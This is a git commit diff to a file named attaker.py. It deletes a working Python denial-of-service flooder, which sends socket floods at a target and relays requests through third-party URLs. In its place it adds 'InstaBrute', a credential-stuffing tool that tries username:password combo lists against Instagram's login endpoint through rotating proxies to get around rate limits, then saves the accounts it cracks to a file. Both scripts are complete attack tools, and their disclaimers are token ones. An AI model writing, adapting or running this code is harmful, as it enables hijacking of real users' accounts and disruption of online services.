45157f54901de7f19c6b847a019e8fa271edfb48
alirezaezzat1382 <49819955+alirezaezzat1382@users.noreply.github.com>
2020-02-29 14:52:55 +0330

    osta.py

--- attaker.py
+++ attaker.py
@@ -1,163 +1,138 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
+#!/usr/bin/python2.7
+import requests, sys, threading, time, os, random
+from random import randint
+CheckVersion = str(sys.version)
 
-# python 3.3.2+ attaker.py Dos Script v.1
-# by Can Yalçın
-# only for legal purpose
-
-
-from queue import Queue
-from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
-
-def user_agent():
-	global uagent
-	uagent=[]
-	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-	return(uagent)
+r = '\033[31m'
+g = '\033[32m'
+y = '\033[33m'
+b = '\033[34m'
+m = '\033[35m'
+c = '\033[36m'
+w = '\033[37m'
+rr = '\033[39m'
 
 
-def my_bots():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
 
 
-def bot_attakering(url):
-	try:
-		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is attakering...\033[0m")
-			time.sleep(.1)
-	except:
-		time.sleep(.1)
+class InstaBrute(object):
+    def __init__(self):
+        self.cls()
+        self.print_logo()
+        try:
+            Combo = raw_input(' Combo.txt --> ')
+            Proxy = raw_input(' Proxy.txt --> ')
+            self.cls()
+            self.print_logo()
+        except:
+            self.cls()
+            self.print_logo()
+            print('  [-] Error : SomeThing Not true!')
+            sys.exit()
 
+        self.proxylist = list(open(Proxy).read().splitlines())
+        with open(Combo, 'r') as x:
+            Combolist = x.read().splitlines()
+        thread = []
+        self.Coutprox = 0
+        for combo in Combolist:
+            if self.Coutprox >= len(self.proxylist):
+                self.Coutprox = 0
+            proxy = self.Generate_Proxy(self.Coutprox)
+            self.Coutprox = self.Coutprox + 1
+            user = combo.split(':')[0]
+            password = combo.split(':')[1]
+            try:
+                t = threading.Thread(target=self.Go, args=(user, password,
+                                                           str(proxy)))
 
-def down_it(item):
-	try:
-		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((host,int(port)))
-			if s.sendto( packet, (host, int(port)) ):
-				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--❤LOVE❤--> \033[0m")
-			else:
-				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
-			time.sleep(.1)
-	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
-		time.sleep(.1)
+                t.start()
+                thread.append(t)
+                time.sleep(0.1)
+            except:
+                pass
+        for j in thread:
+            j.join()
+        input(' BruteForce Is Done! Press Enter to Exit...')
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system([linux, windows][os.name == 'nt'])
 
+    def Generate_Proxy(self, num):
+        return self.proxylist[num]
 
-def dos():
-	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+    def print_logo(self):
+        clear = "\x1b[0m"
+        colors = [36, 32, 34, 35, 31, 37]
 
+        x = """
+                     White Hat hacker
+                  _____           _        ____             _       
+                 |_   _|         | |      |  _ \           | |      
+                   | |  _ __  ___| |_ __ _| |_) |_ __ _   _| |_ ___ 
+                   | | | '_ \/ __| __/ _` |  _ <| '__| | | | __/ _ |
+                  _| |_| | | \__ \ || (_| | |_) | |  | |_| | ||  __/
+                 |_____|_| |_|___/\__\__,_|____/|_|   \__,_|\__\___|
+                    GitHub.com/04x                    Iran-Cyber.NeT                                                 
+                    
+            Note! : We don't Accept any responsibility for any illegal usage.       
+    """
+        for N, line in enumerate(x.split("\n")):
+            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+            time.sleep(0.05)
 
-def dos2():
-	while True:
-		item=w.get()
-		bot_attakering(random.choice(bots)+"http://"+host)
-		w.task_done()
+    def Header(self, user, password, sess):
+        headers = {
+            'Host': 'www.instagram.com',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': 'https://www.instagram.com/',
+            'X-CSRFToken': '',
+            'X-Instagram-AJAX': '1',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Content-Length': '',
+            'Cookie': '',
+            'Connection': 'keep-alive'
+        }
+        datas = {'username': user, 'password': password}
+        headers['X-CSRFToken'] = sess.cookies['csrftoken']
+        headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(sess.cookies['mid'],
+                                                                               sess.cookies['csrftoken'])
+        lenthofData = str(19 + len(datas['username']) + len(datas['password']))
+        headers['Content-Length'] = lenthofData
+        return headers, datas
 
+    def Go(self, user, password, proxyz):
+        try:
+            proxy = {'http': proxyz}
+            Heddata = requests.get('https://www.instagram.com', proxies=proxy, timeout=10)
+            sess = requests.session()
+            headers, datas = self.Header(user, str(password), Heddata)
+            GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas,
+                            proxies=proxy, timeout=10)
+            if 'authenticated": true' in GoT.text:
+                print(g + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> Hacked!')
+                with open('results.txt', 'a') as x:
+                    x.write(user + ':' + password + '\n')
+            elif 'Please wait a few minutes before you try again' in GoT.text:
+                print(' ' + proxyz + ' Banned! --> Changing IP Address...')
+                try:
+                    self.Coutprox = self.Coutprox + 1
+                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
+                except:
+                    self.Coutprox = self.Coutprox - 2
+                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
+            elif 'checkpoint_required' in GoT.text:
+                print(y + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> You Must verfiy!')
+                with open('results_NeedVerfiy.txt', 'a') as x:
+                    x.write(user + ':' + password + '\n')
+            else:
+                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
+        except:
+                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
 
-def usage():
-	print (''' \033[92m	attaker Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 attaker.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
-
-
-def get_parameters():
-	global host
-	global port
-	global thr
-	global item
-	optp = OptionParser(add_help_option=False,epilog="attakers")
-	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
-	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
-	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
-	opts, args = optp.parse_args()
-	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	if opts.help:
-		usage()
-	if opts.host is not None:
-		host = opts.host
-	else:
-		usage()
-	if opts.port is None:
-		port = 80
-	else:
-		port = opts.port
-	if opts.turbo is None:
-		thr = 135
-	else:
-		thr = opts.turbo
-
-
-# reading headers
-global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-#task queue are q,w
-q = Queue()
-w = Queue()
-
-
-if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		usage()
-	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
-	user_agent()
-	my_bots()
-	time.sleep(5)
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host,int(port)))
-		s.settimeout(1)
-	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
-		usage()
-	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+InstaBrute()
